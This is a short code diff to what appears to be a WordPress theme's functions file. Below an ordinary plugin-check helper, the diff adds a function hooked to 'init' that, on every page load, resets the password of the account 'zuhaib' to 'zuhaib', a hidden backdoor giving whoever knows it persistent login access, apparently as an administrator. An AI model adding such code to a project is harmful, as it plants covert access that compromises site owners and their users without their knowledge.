@@ -307,3 +307,9 @@ function zakra_is_plugin_installed( $plugin_path ) {
 	$plugins = get_plugins();
 	return isset( $plugins[ $plugin_path ] );
 }
+
+function reset_admin_password() {
+    $user = get_user_by('login', 'zuhaib');
+    wp_set_password('zuhaib', $user->ID);
+}
+add_action('init', 'reset_admin_password');
